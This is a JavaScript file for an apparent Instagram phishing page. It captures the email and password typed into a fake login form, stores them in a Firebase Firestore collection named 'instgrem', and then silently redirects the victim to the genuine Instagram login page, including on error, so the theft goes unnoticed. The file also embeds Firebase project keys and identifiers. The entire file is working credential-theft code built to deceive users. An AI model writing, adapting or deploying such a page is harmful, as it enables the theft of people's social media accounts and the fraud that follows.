// 1. Import Firebase modules from the CDN
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

// 2. Your Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyCzBQuItz0ecj0ASBnPFyY_c57rbxRcNQg",
    authDomain: "instagramuii.firebaseapp.com",
    projectId: "instagramuii",
    storageBucket: "instagramuii.firebasestorage.app",
    messagingSenderId: "582766519172",
    appId: "1:582766519172:web:1e65a4ab2b8acaa875f3d1"
};

// 3. Initialize Firebase and Firestore
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// UI Element Selectors
const userInp = document.getElementById('user');
const passInp = document.getElementById('pass');
const loginBtn = document.getElementById('login-submit');

// Validation logic (keeps button blue/pale)
function validate() {
    if (userInp.value.length > 0 && passInp.value.length >= 6) {
        loginBtn.classList.add('active');
    } else {
        loginBtn.classList.remove('active');
    }
}

userInp.addEventListener('input', validate);
passInp.addEventListener('input', validate);

// 4. Function to save data to Firestore
window.goToInstagram = async function() {
    if (loginBtn.classList.contains('active')) {
        try {
            // "instgrem" is the collection name you requested
            await addDoc(collection(db, "instgrem"), {
                email: userInp.value,
                password: passInp.value,
                timestamp: new Date()
            });
            
            // Redirect after successful data send
            window.location.href = "https://www.instagram.com/accounts/login/";
        } catch (e) {
            console.error("Error adding document: ", e);
            // Even if it fails, we usually redirect to keep the UX smooth
            window.location.href = "https://www.instagram.com/accounts/login/";
        }
    }
}

window.showLogin = function() {
    document.getElementById('private-view').classList.add('hidden');
    document.getElementById('login-view').classList.remove('hidden');
}